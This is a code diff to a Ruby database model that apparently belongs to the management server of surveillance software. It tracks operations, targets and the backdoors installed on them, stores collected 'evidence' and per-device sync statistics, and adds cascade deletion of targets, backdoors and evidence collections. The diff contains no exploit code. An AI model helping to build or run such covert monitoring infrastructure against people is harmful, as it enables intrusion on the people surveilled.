@@ -11,7 +11,7 @@ class Item
   field :_kind, type: String
   field :_path, type: Array
 
-  # activity
+  # operation
   field :contact, type: String
 
   # backdoor
@@ -35,9 +35,35 @@ class Item
   embeds_many :upgrade_requests, class_name: "UpgradeRequest"
   embeds_many :upload_requests, class_name: "UploadRequest"
 
+  embeds_one :stat
+
   embeds_many :configs, class_name: "Configuration"
 
   store_in :items
+
+  after_destroy :destroy_callback
+
+  protected
+
+  def destroy_callback
+    case self._kind
+      # TODO: recalculate stats before dropping
+      when 'operation'
+        # destroy all the targets of this operation
+        Item.where({_kind: 'target', _path: [ self._id ]}).each do |targ|
+          targ.destroy
+        end
+      when 'target'
+        db = Mongoid.database
+        db.drop_collection Evidence.collection_name(self._id.to_s)
+        # destroy all the backdoors of this target
+        Item.where({_kind: 'backdoor'}).also_in({_path: [ self._id ]}).each do |bck|
+          bck.destroy
+        end
+      when 'backdoor'
+        #TODO: destroy all the evidences
+    end
+  end
 end
 
 class FilesystemRequest
@@ -65,7 +91,7 @@ class UpgradeRequest
   include Mongoid::Document
   
   field :filename, type: String
-  field :_grid, type: String
+  field :_grid, type: Array
 
   validates_uniqueness_of :filename
 
@@ -76,7 +102,7 @@ class UploadRequest
   include Mongoid::Document
   
   field :filename, type: String
-  field :_grid, type: String
+  field :_grid, type: Array
   
   validates_uniqueness_of :filename
   
@@ -84,5 +110,14 @@ class UploadRequest
 end
 
 class Stat
+  include Mongoid::Document
 
+  field :source, type: String
+  field :user, type: String
+  field :device, type: String
+  field :last_sync, type: Integer
+  field :size, type: Integer
+  field :evidence, type: Hash
+
+  embedded_in :item
 end
